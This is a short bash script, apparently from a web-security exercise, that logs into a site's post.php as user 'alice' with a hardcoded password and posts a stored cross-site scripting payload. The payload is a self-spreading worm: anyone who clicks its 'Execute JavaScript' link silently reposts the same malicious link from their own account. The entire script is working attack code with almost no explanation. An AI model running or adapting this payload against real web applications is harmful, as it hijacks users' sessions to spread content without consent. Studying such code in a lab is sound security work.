#!/bin/bash
#Login with alice
curl -c cookie.txt -d "username=alice" -d "password=password123" -d "form=login" -d "submit=Login" "$1/post.php" 

#post the XSS script with alice account. We need to use --data-urlencode because of '+' sign 
curl -b cookie.txt -d "title=Malicious Link Below" --data-urlencode "content=<script>function fn (){var http = new XMLHttpRequest();var url = 'post.php';var params = 'title=Malicious Link Below&content=<a href=\"javascript:fn();\">Execute JavaScript</a>&type=1&form=content&submit=Post';http.open('POST', url, true);http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');http.send(params);}</script><a href=\"javascript:fn();\">Execute Javascript</a>" -d "type=1" -d "form=content" -d "submit=Post" "$1/post.php" > response.txt



